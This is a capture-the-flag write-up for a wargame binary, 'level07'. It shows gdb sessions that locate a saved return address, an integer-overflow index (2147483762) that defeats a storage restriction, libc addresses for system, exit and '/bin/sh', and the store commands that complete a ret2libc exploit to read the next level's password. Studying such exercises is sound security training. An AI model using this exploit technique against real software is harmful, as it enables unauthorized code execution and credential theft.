# Level07

## store command observations

We can see that the store command can store numbers out of the buffer.
So we can use it to write in the saved address.

## find location of saved address

We can use read command to find saved address.

```shell

$ gdb ./level07
(gdb) b *0x0804885c
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------


Breakpoint 1, 0x0804885c in main ()
(gdb) c
Continuing.
Input command: read 
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully

(gdb) info frame
 ...
 eip = 0x804885c in main; saved eip 0xf7e45513
 ...
```

4158936339 dec == f7e45513 hex

So if we write at index 114 we can redirect the program.
But wil decided to reserve all indexes as index % 3 == 0.

In order to bypass this restriction we need to use a value as ((int) x) == 114 and x % 3 != 0.

That's the case for 2147483762.

## Get all adresses for a ret2libc

### system

```shell
$ gdb ./level07
(gdb) b main
(gdb) r
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

system address: 0xf7e6aed0

### exit

```shell
$ gdb ./level07
(gdb) b main
(gdb) r
(gdb) p exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

exit address: 0xf7e5eb70

### /bin/bash

```shell
$ gdb ./level07
(gdb) b main
(gdb) r
(gdb) info proc map
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
...
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
...

$ strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
15d7ec /bin/sh
```

"/bin/sh" address: f7e2c000 hex + 15d7ec hex = 4160264172 dec

## Exploit

```shell
$ ./level07
Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
```
